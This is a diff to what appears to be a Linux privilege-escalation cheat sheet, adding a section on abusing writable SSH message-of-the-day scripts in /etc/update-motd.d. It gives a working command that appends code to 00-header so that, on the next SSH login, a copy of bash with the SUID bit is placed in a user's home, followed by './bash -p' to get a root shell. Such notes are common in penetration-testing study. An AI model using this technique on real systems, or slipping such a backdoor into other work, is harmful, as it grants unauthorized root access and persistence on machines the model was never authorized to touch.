@@ -258,3 +258,20 @@ References:
 - [Nguyen](https://securitynguyen.com/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/)
 
 ---------------------------
+
+### Exploiting right to modify ssh motd(message of the day) in `/etc/update-motd.d`
+
+- Write the sh code to 00-header, the code grants suid bit to the bash file copied to a user's directory, `<username>` represents the user you have access to
+
+      echo "cp /bin/bash /home/<username>/bash && chmod u+s /home/<username>/bash" >> /etc/update-motd.d/00-header
+
+- Exit the ssh connection and reconnect, then run
+
+      ./bash -p
+
+
+### REFERENCES
+   
+- [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/)
+
+----------------------------------------
